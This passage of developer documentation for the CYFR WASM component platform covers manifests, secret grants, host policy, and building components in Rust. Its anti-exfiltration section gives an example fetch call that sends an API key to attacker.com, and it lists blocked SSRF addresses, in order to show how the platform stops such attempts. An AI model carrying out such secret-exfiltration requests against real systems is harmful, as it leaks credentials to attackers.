| `reason` | string | No | Human-readable explanation of why this dependency is needed |

**`dependencies.dynamic`** — informational only, for formulas that discover components at runtime:

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `discovery` | string | Yes | MCP tool/action used for discovery |
| `description` | string | Yes | Explanation of discovery behavior |
| `typical_types` | string[] | No | Common component types discovered |

### Version Resolution

Strict exact match only. The version in `ref` is the required version. To upgrade a dependency, update the `ref` in the manifest. No semver ranges or constraint operators are supported.

### Behavior

- **`cyfr pull`**: After pulling a component, automatically pulls any missing required static dependencies. Optional missing deps produce a warning.
- **`cyfr run`** (formulas): Before executing a formula, Opus checks that all required static dependencies are present. If any are missing, execution is blocked with an actionable error message.
- **`cyfr inspect`**: Returns component details including the full dependency tree with availability annotations (when deps declared).
- **`cyfr register`**: Indexes dependencies from the manifest into the local database for fast lookup.

### Example: Formula with Static Dependencies

```bash
# Pull a formula — its dependencies are auto-pulled
cyfr pull f:local.list-models:0.1.0
# Output:
#   status: ready
#   Pulled 3 dependencies: catalyst:local.claude:0.1.0, catalyst:local.openai:0.1.0, catalyst:local.gemini:0.1.0

# Inspect dependency tree
cyfr inspect f:local.list-models:0.1.0
```

---

## Setup

The `setup` manifest section consolidates everything a component needs for onboarding into a single declaration. Instead of separate `config.json` files and manual secret/policy configuration, component developers declare their requirements directly in `cyfr-manifest.json`, and consumers run `cyfr setup` to apply them.

### What `setup` Replaces

| Old Approach | New Approach |
|---|---|
| Top-level `secrets` array in manifest | `setup.secrets` — richer declarations with `name`, `description`, and `required` |
| `config.json` alongside the binary | Removed — use `defaults` for documented values, `setup.policy` for recommended policy |
| `schema.config` in manifest | Removed — policy values belong in `setup.policy` |
| `cyfr config set` / `cyfr config show` | `cyfr setup` — reads the manifest and applies secrets + policy in one step |

### Manifest `setup` Section

The `setup` section has two optional sub-fields:

| Field | Type | Purpose |
|-------|------|---------|
| `setup.secrets` | array | Secret requirements. Each entry: `name` (string), `description` (string, helps users obtain the value), `required` (bool) |
| `setup.policy` | object | Recommended Host Policy values (e.g., `allowed_domains`, `rate_limit`, `timeout`, `max_memory_bytes`) |

> **Note on Generic Policies:** While Opus provides default execution limits for all components (e.g., 60s timeout for Reagents, 3m for Catalysts), `cyfr setup` relies exclusively on the manifest's `setup.policy` block to extract and configure developer-recommended overrides. If you want your component to default to a 5m timeout or higher `max_memory_bytes` when users run `cyfr setup`, you **must** explicitly declare those generic policies in `setup.policy`.

Components that need configurable values should:

1. **Accept them as part of the `input` JSON** — the caller passes config values in the request
2. **Read them via `cyfr:secrets/read`** — for sensitive values (API keys, tokens)
3. **Hardcode sensible defaults in source code** — this is the recommended pattern for catalysts

The manifest `defaults` block documents vendor-recommended values for human and tooling reference.

> **Setup vs Host Policy**: `setup.policy` is the component developer's *recommendation*. Host Policy is what is actually *enforced* by Opus at the WASI boundary. `cyfr setup` bridges the two by applying the recommended values as the initial policy.

### Example: API Catalyst Setup

**`cyfr-manifest.json`** (relevant sections for an API catalyst):

```json
{
  "setup": {
    "secrets": [
      {
        "name": "API_KEY",
        "description": "API key from https://api.example.com/settings/keys",
        "required": true
      }
    ],
    "policy": {
      "allowed_domains": ["api.example.com"],
      "rate_limit": {"requests": 100, "window": "1m"},
      "timeout": "30s",
      "max_memory_bytes": 134217728
    }
  },
  "defaults": {
    "base_url": "https://api.example.com",
    "api_version": "v1",
    "default_model": "default",
    "default_temperature": 1.0,
    "max_retries": 0
  }
}
```

In a catalyst's source code, values like these would typically be hardcoded (e.g., `const BASE_URL: &str = "https://api.example.com/v1/models"`). The manifest `defaults` block documents what those hardcoded values are so consumers and tooling can reference them.

### `cyfr setup` Workflow

Running `cyfr setup` reads the manifest's `setup` section and walks the user through onboarding:

```bash
# Run setup for a component (interactive — prompts for secrets, confirms policy)
cyfr setup c:local.my-catalyst:1.0.0

# Via MCP (returns a setup plan for programmatic application)
{"tool": "component", "action": "setup_plan", "ref": "c:local.my-catalyst:1.0.0"}
```

The setup command:

1. Reads `setup.secrets` and prompts for each secret value (or confirms existing ones)
2. Stores secrets via Sanctum and grants the component access
3. Reads `setup.policy` and applies the recommended policy values via Arca
4. Reports what was configured

---

## Working with Secrets

Secrets (API keys, tokens, credentials) live in Sanctum, encrypted at rest with AES-256-GCM. Components never read secrets from files — they receive them at runtime through a WASI host function, gated by explicit grants.

### Grant Model

Access is deny-by-default. A component can only read a secret if the user has explicitly granted that component access:

```
User stores secret              User grants access                  Runtime resolves
------------------             ------------------                  ----------------
cyfr secret set               cyfr secret grant                   Opus preloads
  API_KEY=sk-live-...    ->      c:local.stripe-catalyst:1.0 API_KEY  ->    granted secrets into
                                                                   host-side in-memory map
                                                                   served via closure
```

Each secret can be granted to multiple components, and each component can access multiple secrets. Grants are stored alongside the encrypted secret in `data/cyfr.db`.

Decrypted values live in host (Elixir) process memory — they are never embedded in WASM memory. The WASM component retrieves them on-demand via `get()`, and each `get()` is a simple map lookup with no I/O.

### CLI Workflow

All secret operations require sudo (Policy Lock):

```bash
# Store a secret (encrypted at rest)
cyfr secret set API_KEY=sk-live-abc123

# Grant a catalyst access to the secret
cyfr secret grant c:local.stripe-catalyst:1.0 API_KEY

# Revoke access
cyfr secret revoke c:local.stripe-catalyst:1.0 API_KEY

# List all stored secrets
cyfr secret list

# Delete a secret entirely
cyfr secret delete API_KEY
```

### MCP Actions for Secrets

AI agents and programmatic clients manage secrets via MCP tool calls:

```json
// Store a secret
{"action": "set", "name": "API_KEY", "value": "sk-live-abc123"}
→ {"stored": true, "name": "API_KEY"}

// List secret names (values never exposed)
{"action": "list"}
→ {"secrets": ["API_KEY", "STRIPE_KEY"], "count": 2}

// Grant a component access
{"action": "grant", "name": "API_KEY", "component_ref": "catalyst:local.my-api:0.1.0"}
→ {"granted": true, "secret": "API_KEY", "component_ref": "catalyst:local.my-api:0.1.0"}

// Revoke access
{"action": "revoke", "name": "API_KEY", "component_ref": "catalyst:local.my-api:0.1.0"}
→ {"status": "revoked", "secret": "API_KEY", "component_ref": "catalyst:local.my-api:0.1.0"}

// Check if a component can access a secret
{"action": "can_access", "name": "API_KEY", "component_ref": "catalyst:local.my-api:0.1.0"}
→ {"allowed": true}

// Delete a secret entirely (removes all grants)
{"action": "delete", "name": "API_KEY"}
→ {"deleted": true, "name": "API_KEY"}
```

Note: `set`, `delete`, `grant`, and `revoke` require sudo credentials in production.

### How Secrets Work at Runtime

When a catalyst executes, CYFR:

1. Resolves all granted secrets for that component **once** before execution starts
2. Injects them into the WASM host function as an in-memory map
3. Each `get("SECRET_NAME")` call inside the component is a fast map lookup — no disk I/O
4. After execution, all secret values are scrubbed from the output (SecretMasker)

This means:
- Secrets never touch the WASM memory — they stay in the host process
- `get()` is safe to call in loops (it's just a map lookup)
- A catalyst needs **both** a secret grant AND `allowed_domains` policy to function — grants control what data it can read, domains control where it can send data

### Accessing Secrets in a Catalyst (Rust)

Your catalyst imports the `cyfr:secrets/read` interface and calls `get()` with the secret name:

```rust
// In your catalyst's lib.rs
wit_bindgen::generate!({
    world: "catalyst",
    exports: {
        "cyfr:catalyst/run": MyCatalyst,
    },
});

use cyfr::secrets::read;

struct MyCatalyst;

impl Guest for MyCatalyst {
    fn run(input: String) -> String {
        // Retrieve a granted secret at runtime
        let api_key = match read::get("API_KEY") {
            Ok(key) => key,
            Err(e) => return serde_json::json!({"error": e}).to_string(),
        };

        // Use it in an HTTP request (also a host function)
        // cyfr:http/fetch.request takes a JSON string and returns a JSON string
        let req = serde_json::json!({
            "method": "GET",
            "url": "https://api.stripe.com/v1/charges",
            "headers": {"Authorization": format!("Bearer {}", api_key)},
            "body": ""
        });
        let response_json = cyfr::http::fetch::request(&req.to_string());
        // Response: {"status": 200, "headers": {...}, "body": "..."}
        // Error:    {"error": {"type": "domain_blocked", "message": "..."}}

        response_json
    }
}
```

### Catalyst Prerequisite: Host Policy

Before a catalyst can execute, it **must** have a Host Policy with `allowed_domains` set via Sanctum. Without this, Opus rejects execution with a `POLICY_REQUIRED` error. Reagents and Formulas do not require policy.

```bash
# Set allowed domains for a catalyst
cyfr policy set c:local.my-api:0.1.0 allowed_domains '["api.example.com"]'
```

### What Happens on Denial

If a component calls `read::get("SECRET_NAME")` without a grant, the host function returns `Err("access-denied: SECRET_NAME not granted to <component_ref>")` and emits a telemetry event for the audit trail:

```
Component catalyst:local.stripe-catalyst:1.0 denied access to secret "DB_PASSWORD"
  -> Telemetry: [:cyfr, :opus, :secret, :denied]
  -> Logged with component ref, secret name, timestamp
```

The component receives an `Err` variant and should handle it explicitly (e.g., return an error response). The WIT interface and JSON formats are documented in [WIT Interfaces](#wit-interfaces).

### Anti-Exfiltration

Even after a catalyst reads a secret, it cannot send it to an unauthorized server. Host Policy (`allowed_domains`) restricts all outbound HTTP at the WASI boundary:

```
Catalyst reads API_KEY = "sk-live-abc123"
Catalyst calls fetch("https://attacker.com?key=sk-live-abc123")
  -> BLOCKED by Opus: attacker.com not in allowed_domains
```

Additionally, the SecretMasker scrubs all granted secret values from execution output before it reaches logs or audit records — not just plaintext, but also Base64 (standard and URL-safe) and hex-encoded (lowercase and uppercase) variants. This prevents encoded exfiltration through return values.

**Summary of layered defenses protecting secrets at runtime:**

| Layer | What It Does |
|-------|-------------|
| Domain Restriction | `allowed_domains` blocks HTTP to any server not explicitly allowed |
| Private IP Blocking | Blocks SSRF to `127.0.0.1`, `169.254.169.254`, `10.x.x.x`, etc. |
| DNS Pinning | IP pinned on first resolve — prevents DNS rebinding attacks |
| Rate Limiting | Caps requests per time window — stops slow exfiltration |
| Full Request Visibility | All HTTP goes through `cyfr:http/fetch` host function — no CONNECT tunnels |
| SecretMasker | Scrubs plaintext + encoded secret variants from all output |
| Audit Trail | Every secret access and HTTP call logged with component ref and timestamp |

### Reagents Cannot Access Secrets

Reagents have no imports — they are pure computation with no access to `cyfr:secrets/read`, `cyfr:http/fetch`, or any other host function. This is enforced at the WASM level: Locus rejects any reagent binary that declares imports. If your component needs secrets, it must be a catalyst.

---

## Supported Languages

CYFR validates WASM output, not source code. Any language that compiles to a valid WASM Component Model binary can build components. Your toolchain, your choice.

> **Note**: CYFR does not provide or support specific toolchains. The component spec is the only contract that matters.

---

## How to Verify Locally

Always validate your component before importing to CYFR.

### Using the build.validate Action

```json
{
  "action": "validate",
  "artifact": { "path": "components/reagents/local/my-reagent/0.1.0/reagent.wasm" },
  "target": "reagent"
}
```

Response:
```json
{
  "valid": true,
  "target": "reagent",
  "exports": ["cyfr:reagent/compute"],
  "imports": [],
  "warnings": []
}
```

### Using wasm-tools (Local)

```bash
# Install wasm-tools
cargo install wasm-tools

# Validate WASM binary
wasm-tools validate component.wasm

# Inspect exports
wasm-tools component wit component.wasm

# Check for WASI imports (should be empty for reagents)
wasm-tools print component.wasm | grep "(import"
```

### Validation Checklist

Before importing, verify:

- [ ] Binary is valid WASM (`wasm-tools validate`)
- [ ] Correct interface exported (`wasm-tools component wit`)
- [ ] No forbidden imports (check for WASI imports on reagents)
- [ ] Binary size under 50 MB
- [ ] Test with sample input/output locally

---

## Example: Building a Reagent in Rust

Step-by-step guide to building a simple reagent component.

### 1. Create Project

```bash
mkdir -p components/reagents/local/my-reagent/0.1.0/src
cd components/reagents/local/my-reagent/0.1.0/src
cargo init --lib --name my-reagent
```

### 2. Configure Cargo.toml

```toml
[package]
name = "my-reagent"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen = "0.25"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

[profile.release]
opt-level = "s"
lto = true
```

### 3. Add WIT Definition

Copy the canonical reagent WIT into your project:

```bash
cp -r wit/reagent/ components/reagents/local/my-reagent/0.1.0/src/wit/
```

This gives you `wit/world.wit`:

```wit
package cyfr:reagent@0.1.0;

interface compute {
    compute: func(input: string) -> string;
}

world reagent {
    export compute;
}
```

### 4. Implement the Component

```rust
// src/lib.rs
wit_bindgen::generate!({
    world: "reagent",
    exports: {
        "cyfr:reagent/compute": MyReagent,
    },
});

use exports::cyfr::reagent::compute::Guest;

struct MyReagent;

impl Guest for MyReagent {
    fn compute(input: String) -> String {
        // Parse JSON input
        let data: serde_json::Value = match serde_json::from_str(&input) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({"error": e.to_string()}).to_string(),
        };

        // Your computation here
        let result = process_data(data);

        // Return JSON output
        serde_json::to_string(&result).unwrap_or_else(|e| {
            serde_json::json!({"error": e.to_string()}).to_string()
        })
    }
}

fn process_data(data: serde_json::Value) -> serde_json::Value {
    // Your logic here
    data
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy binary to canonical location
cp target/wasm32-wasip2/release/my_reagent.wasm ../reagent.wasm

# Optional: remove build artifacts to save disk space (~500MB+ per component)
cargo clean
```

### 6. Create Manifest

Create `components/reagents/local/my-reagent/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "reagent:local.my-reagent",
  "type": "reagent",
  "version": "0.1.0",
  "description": "My custom data processing reagent",
  "schema": {
    "input": { "type": "object" },
    "output": { "type": "object" }
  }
}
```

This is the minimum manifest for a reagent. No `wasi` or `secrets` fields are needed since reagents have no imports.

### 7. Validate

```bash
wasm-tools validate components/reagents/local/my-reagent/0.1.0/reagent.wasm
```

### 8. Import to CYFR

```bash
cyfr import components/reagents/local/my-reagent/0.1.0/reagent.wasm --target reagent
```

---

## Example: Building a Catalyst in Rust

This walkthrough covers building a catalyst — a component with HTTP and secrets access.

### 1. Create Project

```bash
mkdir -p components/catalysts/local/my-api/0.1.0/src
cd components/catalysts/local/my-api/0.1.0/src
cargo init --lib --name my-api-catalyst
```

### 2. Configure Cargo.toml

```toml
[package]
name = "my-api-catalyst"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen-rt = "0.25"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

[package.metadata.component.target.dependencies]
"cyfr:secrets" = { path = "wit/deps/cyfr-secrets" }
"cyfr:http" = { path = "wit/deps/cyfr-http" }

[profile.release]
opt-level = "s"
lto = true
codegen-units = 1
strip = true
```

### 3. Copy Catalyst WIT (Including Deps)

```bash
cp -r wit/catalyst/ components/catalysts/local/my-api/0.1.0/src/wit/
```

This gives you:

```
src/wit/
+-- world.wit                      # cyfr:catalyst@0.1.0
+-- deps/
    +-- cyfr-secrets/read.wit      # cyfr:secrets/read
    +-- cyfr-http/interfaces.wit   # cyfr:http/fetch + cyfr:http/streaming
```

### 4. Implement the Component

```rust
// src/lib.rs
#[allow(warnings)]
mod bindings;

use bindings::exports::cyfr::catalyst::run::Guest;

struct MyCatalyst;

bindings::export!(MyCatalyst with_types_in bindings);

impl Guest for MyCatalyst {
    fn run(input: String) -> String {
        let request: serde_json::Value = match serde_json::from_str(&input) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({
                "error": {"message": format!("Invalid JSON: {}", e), "type": "invalid_request"}
            }).to_string(),
        };

        let operation = request["operation"].as_str().unwrap_or("");
        let params = &request["params"];

        match operation {
            "data.get" => fetch_data(params),
            _ => serde_json::json!({
                "error": {"message": format!("Unknown operation: {}", operation), "type": "invalid_request"}
            }).to_string(),
        }
    }
}

fn fetch_data(params: &serde_json::Value) -> String {
    // Read API key from secrets
    let api_key = match bindings::cyfr::secrets::read::get("MY_API_KEY") {
        Ok(key) => key,
        Err(e) => return serde_json::json!({"error": {"message": e, "type": "secret_denied"}}).to_string(),
    };

    // Make HTTP request via host function
    let req = serde_json::json!({
        "method": "GET",
        "url": "https://api.example.com/data",
        "headers": {
            "Authorization": format!("Bearer {}", api_key),
            "Content-Type": "application/json"
        }
    });

    let response_json = bindings::cyfr::http::fetch::request(&req.to_string());

    // Parse host response and format output
    let response: serde_json::Value = match serde_json::from_str(&response_json) {
        Ok(v) => v,
        Err(e) => return serde_json::json!({"error": {"message": e.to_string(), "type": "http_error"}}).to_string(),
    };

    if let Some(error) = response.get("error") {
        return serde_json::json!({"status": 502, "error": error}).to_string();
    }

    let status = response["status"].as_u64().unwrap_or(500);
    let body = response["body"].as_str().unwrap_or("");

    serde_json::json!({"status": status, "data": body}).to_string()
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy to canonical location
cp target/wasm32-wasip2/release/my_api_catalyst.wasm ../catalyst.wasm

# Optional: remove build artifacts to save disk space (~500MB+ per component)
cargo clean
```

### 6. Create Manifest

Create `components/catalysts/local/my-api/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "catalyst:local.my-api",
  "type": "catalyst",
  "version": "0.1.0",
  "description": "Bridge to Example API",
  "wasi": {
    "http": true,
    "secrets": true
  },
  "setup": {
    "secrets": [
      {
        "name": "MY_API_KEY",
        "description": "API key from https://api.example.com/settings",
        "required": true
      }
    ],
    "policy": {
      "allowed_domains": ["api.example.com"],
      "rate_limit": {"requests": 100, "window": "1m"},
      "timeout": "30s"
    }
  },
  "schema": {
    "input": {
      "type": "object",
      "required": ["operation"],
      "properties": {
        "operation": { "type": "string" },
        "params": { "type": "object" }
      }
    },
    "output": { "type": "object" }
  }
}
```

### 7. Run Setup

Before the catalyst can run, use `cyfr setup` to configure secrets and policy from the manifest:

```bash
# Interactive setup — prompts for secrets, applies recommended policy
cyfr setup c:local.my-api:0.1.0
```

### 8. Validate and Test

```bash
# Validate the binary
wasm-tools validate components/catalysts/local/my-api/0.1.0/catalyst.wasm

# Import as draft and test
cyfr import components/catalysts/local/my-api/0.1.0/catalyst.wasm --target catalyst
```

---

## Example: Building a Formula in Rust

This example builds a Formula that invokes an API catalyst to list available models — a real composition use case.

### 1. Create Project

```bash
mkdir -p components/formulas/local/list-models/0.1.0/src
cd components/formulas/local/list-models/0.1.0/src
cargo init --lib --name list-models
```

### 2. Configure Cargo.toml

```toml
[package]
name = "list-models"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen = "0.25"
serde_json = "1.0"

[profile.release]
opt-level = "s"
lto = true
```

### 3. Copy Formula WIT

```bash
cp -r wit/formula/ components/formulas/local/list-models/0.1.0/src/wit/
```

### 4. Implement the Formula

```rust
// src/lib.rs
wit_bindgen::generate!({
    world: "formula",
    exports: {
        "cyfr:formula/run": ListModels,
    },
});

use exports::cyfr::formula::run::Guest;
use cyfr::formula::invoke;

struct ListModels;

impl Guest for ListModels {
    fn run(input: String) -> String {
        // Parse input (optional — could accept filter params)
        let _input: serde_json::Value = serde_json::from_str(&input)
            .unwrap_or(serde_json::json!({}));

        // Invoke the API catalyst to list models
        let response = invoke::call(&serde_json::json!({
            "reference": {"registry": "catalyst:local.my-api:0.1.0"},
            "input": {
                "operation": "models.list",
                "params": {}
            },
            "type": "catalyst"
        }).to_string());

        // Parse the invoke response
        let result: serde_json::Value = match serde_json::from_str(&response) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({
                "error": format!("Failed to parse invoke response: {}", e)
            }).to_string(),
        };

        // Check for invoke-level errors
        if result.get("error").is_some() {
            return response; // Forward the error as-is
        }

        // Extract the output from the successful invoke
        // The invoke response is: {"status": "completed", "output": {...}}
        // The output contains the catalyst's response: {"status": 200, "data": {...}}
        let output = &result["output"];

        // Parse the catalyst output (it's a JSON string from the catalyst)
        let catalyst_result: serde_json::Value = match serde_json::from_str(
            output.as_str().unwrap_or("{}")
        ) {
            Ok(v) => v,
            Err(_) => output.clone(),
        };

        // Return the model list
        serde_json::json!({
            "models": catalyst_result.get("data").cloned().unwrap_or(catalyst_result)
        }).to_string()
    }
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy to canonical location
cp target/wasm32-wasip2/release/list_models.wasm ../formula.wasm

# Optional: remove build artifacts to save disk space (~500MB+ per component)
cargo clean
```

### 6. Create Manifest

Create `components/formulas/local/list-models/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "formula:local.list-models",
  "type": "formula",
  "version": "0.1.0",
  "description": "Lists available models via an API catalyst",
  "schema": {
    "input": { "type": "object" },
    "output": {
      "type": "object",
      "properties": {
        "models": { "type": "object" }
      }
    }
  }
}
```

### 7. Prerequisites

The API catalyst must be registered and configured before this formula can invoke it:

```bash
# Register the local API catalyst for discovery
cyfr register

# Ensure secrets and policy are set for the API catalyst
cyfr secret set MY_API_KEY=sk-your-key
cyfr secret grant c:local.my-api:0.1.0 MY_API_KEY
cyfr policy set c:local.my-api:0.1.0 allowed_domains '["api.example.com"]'
```

### 8. Validate, Import, and Test

```bash
# Validate
wasm-tools validate components/formulas/local/list-models/0.1.0/formula.wasm

# Import as draft
cyfr import components/formulas/local/list-models/0.1.0/formula.wasm --target formula
# Returns: draft_<id>

# Test with empty input
cyfr run draft:<id> --input '{}'
```

### Parallel Invocation Example

This example shows how a Formula can invoke multiple catalysts concurrently using `call-batch` + `poll-all` + `close`:

```rust
use cyfr::formula::invoke;

fn run(input: String) -> String {
    // Launch two API calls in parallel
    let batch_response = invoke::call_batch(&serde_json::json!({
        "invocations": [
            {
                "reference": {"registry": "catalyst:local.claude:0.2.0"},
                "input": {"prompt": "Summarize this document"},
                "type": "catalyst"
            },
            {
                "reference": {"registry": "catalyst:local.openai:0.2.0"},
                "input": {"prompt": "Summarize this document"},
                "type": "catalyst"
            }
        ]
    }).to_string());

    let batch: serde_json::Value = serde_json::from_str(&batch_response).unwrap();
    if batch.get("error").is_some() {
        return batch_response;
    }
    let handle = batch["batch"].as_str().unwrap();

    // Poll until all complete
    loop {
        let poll_response = invoke::poll_all(&serde_json::json!({
            "batch": handle
        }).to_string());

        let poll: serde_json::Value = serde_json::from_str(&poll_response).unwrap();
        if poll["all_done"].as_bool().unwrap_or(false) {
            // Cleanup and return results
            invoke::close(&serde_json::json!({"batch": handle}).to_string());
            return serde_json::json!({
                "results": poll["results"]
            }).to_string();
        }

        // WASM has no sleep — poll again immediately.
        // The host blocks briefly on each poll call, providing natural backoff.
    }
}
```

---

## Testing and Running Components

### End-to-End Testing Flow

```
1. Build       cargo component build --release --target wasm32-wasip2
2. Validate    wasm-tools validate <type>.wasm
3. Policy      cyfr policy set c:<ref> allowed_domains '["api.example.com"]'  ← catalysts only
4. Secrets     cyfr secret set KEY=val && cyfr secret grant c:<ref> KEY       ← catalysts only
5. Execute     cyfr run <type>:<reference> --input '{...}'
6. Verify      Check the JSON response
7. Logs        cyfr run --logs <execution_id>
8. Iterate     Rebuild + re-run (policy/secrets persist)
```

> **Tip**: Open `http://localhost:4001` to view execution details, logs, and resource usage in the Prism dashboard.

Steps 3-4 only apply to catalysts. Reagents need zero setup. Formulas need setup only for their sub-components.

### Component Reference Format

References follow the format `type:namespace.name:version`:

- `c:local.claude` — catalyst, latest version (shorthand `c`)
- `c:local.claude:0.1.0` — catalyst, specific version
- `r:local.my-reagent` — reagent (shorthand `r`)
- `f:local.list-models` — formula (shorthand `f`)

The version is **optional** — when omitted, it defaults to `latest`. The type prefix is **required** — untyped refs are rejected with a helpful error message.

### Running Components via CLI

```bash
# Run by typed ref (version optional — defaults to latest)
cyfr run r:local.my-reagent --input '{"data": [1,2,3]}'

# Run with specific version
cyfr run r:local.my-reagent:0.1.0 --input '{"data": [1,2,3]}'

# CLI shorthand: type as separate arg
cyfr run r local.my-reagent --input '{"data": [1,2,3]}'

# Run a catalyst (version optional)
cyfr run c:local.my-api \
  --input '{"operation": "models.list", "params": {}}'

# Run a published component
cyfr run c:my-api:0.1.0 \
  --input '{"operation": "models.list"}'

# Run a local file directly
cyfr run ./components/reagents/local/my-reagent/0.1.0/reagent.wasm \
  --input '{"data": [1,2,3]}'

# List recent executions
cyfr run --list

# View execution details
cyfr run --logs exec_<id>

# Cancel a running execution
cyfr run --cancel exec_<id>
```

### Execution Response Format

```json
{
  "status": "completed",
  "execution_id": "exec_01234567-...",
  "result": {"models": [...]},
  "duration_ms": 1523,
  "component_type": "catalyst",
  "component_digest": "sha256:abc...",
  "reference": {"local": "..."},
  "policy_applied": {
    "allowed_domains": ["api.example.com"],
    "rate_limit": {"requests": 100, "window": "1m"}
  }
}
```

- `status` — `completed` means the WASM executed. The component may still return an error in its `result`.
- `result` — Whatever JSON the component returned.
- `policy_applied` — The policy active during execution (useful for debugging).

### Running Components via MCP (for AI Agents)

AI agents call the same tools programmatically via JSON-RPC:

**Execute:**
```json
{
  "jsonrpc": "2.0", "id": 1, "method": "tools/call",
  "params": {
    "name": "execution",
    "arguments": {
      "action": "run",
      "reference": {"local": "components/catalysts/local/my-api/0.1.0/catalyst.wasm"},
      "input": {"operation": "models.list", "params": {}},
      "type": "catalyst"
    }
  }
}
```

**List:** `{"action": "list", "status": "all", "limit": 20}`

**Logs:** `{"action": "logs", "execution_id": "exec_..."}`

**Cancel:** `{"action": "cancel", "execution_id": "exec_..."}`

Always specify `"type"` explicitly — don't rely on the `"reagent"` default.

### Setting Up Catalysts Before Testing

Catalysts require policy and secrets before they can execute:

```bash
# 1. Set allowed domains (REQUIRED — fails without this)
cyfr policy set c:local.my-api:0.1.0 allowed_domains '["api.example.com"]'

# 2. Store and grant secrets (if the catalyst reads secrets)
cyfr secret set MY_API_KEY=sk-live-abc123
cyfr secret grant c:local.my-api:0.1.0 MY_API_KEY

# 3. Now execute
cyfr run c:local.my-api:0.1.0 \
  --input '{"operation": "models.list"}'
```

Without policy: `"Catalyst 'my-api:0.1.0' has no allowed_domains configured."`

### Common Response Patterns

| Scenario | What You See |
|---|---|
| Success | `{"status": "completed", "result": {...}}` |
| Component returned error | `{"status": "completed", "result": {"error": {...}}}` |
| Missing policy | `"Catalyst 'X' has no allowed_domains configured."` |
| Rate limited | `"Rate limit exceeded. Retry in 60s"` |
| Timeout | `"Execution timeout after 10000ms"` |
| Secret denied | `"access-denied: API_KEY not granted to X"` |

### Viewing Logs and Audit

```bash
cyfr run --logs exec_<id>            # Full execution details
cyfr audit executions --limit 10     # Recent executions summary
cyfr audit list                      # Full audit log
cyfr audit export --format json      # Export audit data
```

---

## Draft Workflow

The draft workflow is the development iteration cycle for components. Drafts are ephemeral, in-memory WASM binaries for testing before publishing.

> **Tip**: For local development, registration provides a simpler path than drafts: build your component, place it in `components/{type}s/local/{name}/{version}/`, run `cyfr register`, and it's immediately searchable and executable via `{"registry": "name:version"}`. Use drafts when you want rapid iteration without rebuilding.

### Lifecycle

```
1. Build:    cargo component build --release --target wasm32-wasip2
2. Import:   build.import action -> returns draft_id (e.g., draft_a1b2c3d4e5f6g7h8)
3. Test:     execution.run with {"draft": "draft_a1b2c3d4e5f6g7h8"} -> test output
4. Iterate:  rebuild -> re-import -> re-test
5. Publish:  component.publish with draft_id + metadata -> permanent in components/
6. Run:      execution.run with {"registry": "name:version"}
```

### Draft Properties

- **Ephemeral**: Stored in-memory only — lost on server restart
- **TTL**: 24-hour expiry (configurable)
- **User-isolated**: Only accessible by the creating user (keyed by `{:draft, user_id, draft_id}`)
- **Not signed**: No Sigstore verification required (unlike published components)
- **ID format**: `draft_` prefix + 16 lowercase hex characters (e.g., `draft_a1b2c3d4e5f6g7h8`)

### MCP Actions

**Import a draft:**

```json
{
  "action": "import",
  "artifact": {"path": "components/reagents/local/my-tool/0.1.0/reagent.wasm"},
  "target": "reagent"
}
```

Response: `{"draft_id": "draft_a1b2c3d4e5f6g7h8", "name": "my-tool", "size": 245760}`

**Execute a draft:**

```json
{
  "action": "run",
  "reference": {"draft": "draft_a1b2c3d4e5f6g7h8"},
  "input": {"key": "value"},
  "type": "reagent"
}
```

**List drafts:**

```json
{"action": "list_drafts"}
```

**Delete a draft:**

```json
{"action": "delete_draft", "draft_id": "draft_a1b2c3d4e5f6g7h8"}
```

### Published Components

After testing via drafts, publish to make the component permanent and available via registry reference:

```json
{
  "action": "publish",
  "draft_id": "draft_a1b2c3d4e5f6g7h8",
  "manifest": {"id": "reagent:local.my-tool", "type": "reagent", "version": "0.1.0", "description": "..."}
}
```

Published components are **permanent and immutable** — stored in `components/` and accessible via `{"registry": "my-tool:0.1.0"}`.

---

## Common Errors and Fixes

Quick reference for frequent issues.

### Build-Time Errors

#### FORBIDDEN_IMPORT

**Error**: Reagent imports WASI interface

**Cause**: Your reagent has imports, but reagents must be pure.

**Fix**:
```bash
# Check for imports
wasm-tools print component.wasm | grep "(import"

# Common causes:
# - Using std::time, std::net, std::fs
# - Using random number generation (use deterministic seed instead)
# - Dependencies pulling in WASI
```

Solutions:
- Use `#[cfg(target_arch = "wasm32")]` to exclude non-WASM code
- Replace std library calls with pure alternatives
- Audit dependencies for WASI usage

#### MISSING_EXPORT

**Error**: Required interface not exported

**Cause**: Component doesn't export the correct interface.

**Fix**:
- Verify WIT definition includes correct export
- Check wit-bindgen generate! macro configuration
- Ensure implementation struct is properly exported

#### INVALID_WASM

**Error**: Binary is not valid WebAssembly

**Cause**: Build produced invalid output.

**Fix**:
- Check build logs for errors
- Verify target is `wasm32-wasip2` or `wasm32-unknown-unknown`
- Update toolchain to latest stable version
- Try `wasm-tools validate` locally for detailed errors

#### SIZE_EXCEEDED

**Error**: Binary exceeds 50 MB limit

**Fix**:
- Enable LTO: `lto = true` in Cargo.toml
- Use opt-level "s" or "z" for size optimization
- Remove unused dependencies
- Consider splitting into multiple components

### Runtime Errors

#### POLICY_REQUIRED

**Error**: `Catalyst 'my-catalyst' has no allowed_domains configured.`

**Cause**: Catalyst has no Host Policy set.

**Fix**:
```bash
cyfr policy set c:local.my-catalyst:1.0 allowed_domains '["api.example.com"]'
```

#### DOMAIN_BLOCKED

**Error**: `{"error": {"type": "domain_blocked", "message": "evil.com not in allowed_domains"}}`

**Cause**: HTTP request to a domain not in the catalyst's `allowed_domains` policy.

**Fix**: Add the domain to the catalyst's allowed domains:
```bash
cyfr policy set c:local.my-catalyst:1.0 allowed_domains '["api.example.com", "cdn.example.com"]'
```

#### RATE_LIMITED

